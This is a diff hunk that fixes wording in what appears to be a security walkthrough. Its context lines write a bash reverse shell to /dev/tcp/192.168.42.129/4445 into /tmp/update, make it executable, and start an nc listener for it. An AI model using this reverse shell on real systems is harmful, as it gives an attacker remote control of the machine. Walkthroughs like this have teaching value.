@@ -178,7 +178,7 @@ $ echo "bash -i >& /dev/tcp/192.168.42.129/4445 0>&1" > /tmp/update
 $ chmod +x /tmp/update
 ```
 
-Start `nc` listener on the attacking machine, specifying expected reverse shell port (4445 in this case):
+Start `nc` listener on the attacking machine, specifying the expected reverse shell port (4445 in this case):
 
 ```bash
 $ nc -vnlp 4445
